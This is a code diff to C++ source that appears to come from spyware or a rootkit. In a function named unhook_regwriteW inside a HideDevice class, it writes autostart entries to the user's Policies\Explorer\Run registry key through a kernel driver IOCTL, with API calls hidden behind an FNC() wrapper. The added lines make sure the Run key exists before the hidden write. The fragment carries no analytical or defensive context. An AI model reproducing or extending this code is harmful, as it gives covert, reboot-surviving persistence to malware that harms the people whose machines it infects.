@@ -463,6 +463,7 @@ BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value)
 	REE reg_struct;
 	DWORD dummy;
 	WCHAR *user_sid;
+	HKEY hOpen;
 
 	if ( hFile == INVALID_HANDLE_VALUE )
 		return FALSE;
@@ -482,6 +483,9 @@ BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value)
 #else
 	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", user_sid);
 #endif
+	if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", &hOpen) == ERROR_SUCCESS) 
+		FNC(RegCloseKey)(hOpen);
+
 	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
 	return ret_val;
 }
